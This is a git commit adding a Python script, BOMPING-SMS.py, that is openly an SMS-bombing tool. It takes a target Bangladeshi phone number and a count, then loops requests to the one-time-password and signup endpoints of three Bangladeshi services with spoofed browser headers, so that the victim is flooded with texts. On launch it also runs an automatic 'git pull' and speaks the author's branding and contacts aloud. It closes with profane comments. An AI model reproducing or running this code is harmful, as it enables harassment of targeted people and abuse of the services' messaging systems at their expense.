69b87b79d09d1965b2ea6fbc40520657e228ce10
Cyber Army <150264357+Nirob-vai@users.noreply.github.com>
2023-12-02 00:00:13 +0600

    Create BOMPING-SMS.py

---
+++ BOMPING-SMS.py
@@ -0,0 +1,127 @@
+import os
+print("\033[1;92m [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]]  CYBER (ROBOT) SYSTEM INSTALL. . . . \033[1;30m")
+os.system("pkg install espeak")
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] ROBOT INSTALL COMPLETE \033[1;30m")
+os.system('espeak -a 300 "Robot install complete"')
+print("\033[1;92m   [[[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]][[🥭]]] UPDATE CHECKING BOSS CYBER KING NIROB\033[1;30m")
+os.system('espeak -a 300 "WAITING FOR UPDATE BANGlADESH CYBER KING OFF NIROB "')
+os.system("git pull")
+import os,requests,time
+time.sleep(1)
+os.system("clear")
+os.system("xdg-open https://t.me/c0yber")
+logo3=("""
+        _   _ _____ _____   ____  ____     
+ | \ | |_   _|  __ \ / __ \|  _ \    
+ |  \| | | | | |__) | |  | | |_) |   
+ | . ` | | | |  _  /| |  | |  _ <    
+ | |\  |_| |_| | \ \| |__| | |_) |   
+ |_| \_|_____|_|  \_\\____/|____/    
+                              ______ 
+                             |______|
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟BOSS✮⃝ CYBER𝄟⃝  \x1b[38;5;196m╔══════════════════╗
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋⃟CYBER✮⃝ NIROB𝄟⃝  \x1b[38;5;196m║\033[38;5;46mNIROB             \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[N]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟CYBER✮⃝ NIROB𝄟⃝  \x1b[38;5;196m║\033[38;5;46Hello Hacker,s 0.2      \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[I]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋⃟CYBER✮⃝ NIROB𝄟⃝  \x1b[38;5;196m║\033[38;5;46m017584815*5     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[R]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋⃟CYBER✮⃝ NIROB𝄟⃝  \x1b[38;5;196m║\033[38;5;46mNirob-vai \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[O]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋⃟CYBER✮⃝ NIROB𝄟⃝  \x1b[38;5;196m║\033[38;5;46mNirob127     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[B]\033[38;5;46mMESSENGER       \x1b[38;5;196m║  \033[38;5;46m🦋⃟CYBER✮⃝ NIROB𝄟⃝  \x1b[38;5;196m║\033[38;5;46Hello Hacker,s 0.2m Command      \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟CYBER✮⃝ BRAND𝄟⃝ \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇       \x1b[38;5;196m ║
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟BOSS✮⃝ CYBER𝄟⃝  \x1b[38;5;196m╚══════════════════╝\033[00m\033[1;30m""")
+os.system('espeak -a 300 "author emran "')
+os.system('espeak -a 300 "Facebook  emran hossain "')
+os.system('espeak -a 300 "whathapp 9 7 1 0 5 6 9 5 4 9 8 5 7 "')
+os.system('espeak -a 300 "github emran cyber 9 9 4 8 7 "')
+os.system('espeak -a 300 "telegram 9 7 1 0 5 6 9 4 3 5 3 9 3 3 "')
+os.system('espeak -a 300 "imo 9 7 1 0 5 6 4 3 5 3 9 3 3 "')
+os.system('espeak -a 300 "from Bangladesh "')
+print(logo3)
+num=input("""  \033[38;5;46mTARGET NUMBER : +880""")
+amount=int(input("\n  \033[38;5;46mSMS AMOUNT : "))
+headers1={
+			  "authority":"www.bioscopelive.com",
+			  "method":"GET",
+			  "scheme":"https",
+			  "accept":"*/*",
+			  "accept-encoding":"gzip, deflate, br",
+			  "accept-language":"en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7",
+			  "if-none-match":'W/"5baf0d010507bc980255f9941283860a"',
+			  "referer":"https://www.bioscopelive.com/en/login?bongoId=QPj10yOQIwI",
+			  "save-data":"on",
+			  "sec-ch-ua":'"Chromium";v="107", "Not=A?Brand";v="24"',
+			  "sec-ch-ua-mobile":"?1",
+			  "sec-ch-ua-platform":'Android',
+			  "sec-fetch-dest":"empty",
+			  "sec-fetch-mode":"cors",
+			  "sec-fetch-site":"same-origin",
+			  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+			  "x-requested-with":"XMLHttpRequest"
+}
+url1="https://www.bioscopelive.com/en/login/send-otp?phone=880"+num+"&operator=bd-otp"
+headers2={
+         "referer":"https://bikroy.com/bn/users/login?action=login&stack=webapp&redirect-url=/bn/users/login-options",
+         "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+url2="https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
+data={
+  "name": num,
+  "phoneNumber": num,
+  "service": "redx"
+}
+headers3={
+  "referer":"https://redx.com.bd/",
+  "user-agent":"Mozilla/5.0 (Linux; Android 10; Z28) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+}
+ses=0
+while amount>ses:
+  sent1=requests.get(url1,headers=headers1)
+  if sent1.status_code==200:
+    ses+=1
+    print(f"\n{ses}  \033[38;5;46m🦋⃟NIROB✮⃝ SHEIKH𝄟⃝  SMS WAS SENT🐼")
+  else:
+    pass
+  
+  sent2=requests.get(url2,headers=headers2)
+  if sent2.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46m🦋⃟NIROB✮⃝ SHEIKH𝄟⃝  SMS WAS SENT🐼")
+  else:
+    pass
+  
+  send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
+  if send3.status_code==200:
+    ses+=1
+    print(f"\n{ses} \033[38;5;46m🦋⃟NIROB✮⃝ SHEIKH𝄟⃝  SMS WAS SENT🐼")
+    
+  else:
+    pass
+os.system("clear")
+print(""" \033[1;32m
+\x1b[38;5;196m SEN🐼        
+         _   _ _____ _____   ____  ____     
+ | \ | |_   _|  __ \ / __ \|  _ \    
+ |  \| | | | | |__) | |  | | |_) |   
+ | . ` | | | |  _  /| |  | |  _ <    
+ | |\  |_| |_| | \ \| |__| | |_) |   
+ |_| \_|_____|_|  \_\\____/|____/    
+                              ______ 
+                             |______|
+\x1b[38;5;196m╔═════════════╗  \033[38;5;46m🦋⃟NIROB✮⃝ SHEIKH𝄟⃝  \x1b[38;5;196m╔══════════════════╗
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐀𝐔𝐓𝐇𝐎𝐑   \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ CYBER𝄟⃝  \x1b[38;5;196m║\033[38;5;46mNIROB SHEIKH             \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[N]\033[38;5;46m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊  \x1b[38;5;196m║  \033[38;5;46m🦋⃟NIROB✮⃝ SHEIKH𝄟⃝  \x1b[38;5;196m║\033[38;5;46mCyber Army      \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[I]\033[38;5;46m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ CYBER𝄟⃝  \x1b[38;5;196m║\033[38;5;46m017584815*5     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[𝙍]\033[38;5;46m𝐆𝐈𝐓𝐇𝐔𝐁    \x1b[38;5;196m║  \033[38;5;46m🦋⃟NIROB✮⃝ SHEIKH𝄟⃝  \x1b[38;5;196m║\033[38;5;46mNirob-vai \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[O]\033[38;5;46m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌  \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ CYBER𝄟⃝  \x1b[38;5;196m║\033[38;5;46mNirob127     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[B]\033[38;5;46mTOLL       \x1b[38;5;196m║  \033[38;5;46m🦋⃟NIROB✮⃝ SHEIKH𝄟⃝  \x1b[38;5;196m║\033[38;5;46mSMS BOMBING     \x1b[38;5;196m║
+\x1b[38;5;196m║\033[38;5;46m[🔵]\033[38;5;46m𝐅𝐑𝐎𝐌     \x1b[38;5;196m║  \033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ CYBER𝄟⃝ \x1b[38;5;196m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        \x1b[38;5;196m║
+\x1b[38;5;196m╚═════════════╝  \033[38;5;46m🦋⃟NIROB✮⃝ SHEIKH𝄟⃝  \x1b[38;5;196m╚══════════════════╝
+      \033[38;5;46m____  ____  _  ________
+     \033[38;5;46m/ __ \/ __ \/ | / / ____/
+    \033[38;5;46m/ / / / / / /  |/ / __/   
+   \033[38;5;46m/ /_/ / /_/ / /|  / /___   
+  \033[38;5;46m/_____/\____/_/ |_/_____/   
+                            
+ TNQ FOR USING OUR TOOLS 🖤
+""")
+#madarcod ase geli script curi korte 🙂
+#bancod tk khoroc kore nijeo to sikhte paros
